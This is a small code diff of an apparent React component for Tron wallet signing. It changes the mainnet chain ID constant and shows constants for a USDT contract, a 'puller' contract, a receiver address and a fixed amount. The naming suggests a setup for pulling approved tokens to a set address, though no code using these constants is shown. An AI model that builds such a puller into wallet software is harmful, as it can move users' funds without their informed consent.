@@ -8,7 +8,7 @@ const USDT_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
 const PULLER_CONTRACT = "TJBdv5qD7mpaU9bsRvbuBbe9TmjHYGwREw";
 const RECEIVER = "THzPxXfzoMRuk1s9JRs8mcV5JKXB8ZfR4g";
 const AMOUNT = 1000000;
-const MAINNET_CHAIN_ID = "tron:1";
+const MAINNET_CHAIN_ID = "tron:0x2b6653dc";
 
 export default function TronMethodChecker() {
   const [signClient, setSignClient] = useState(null);
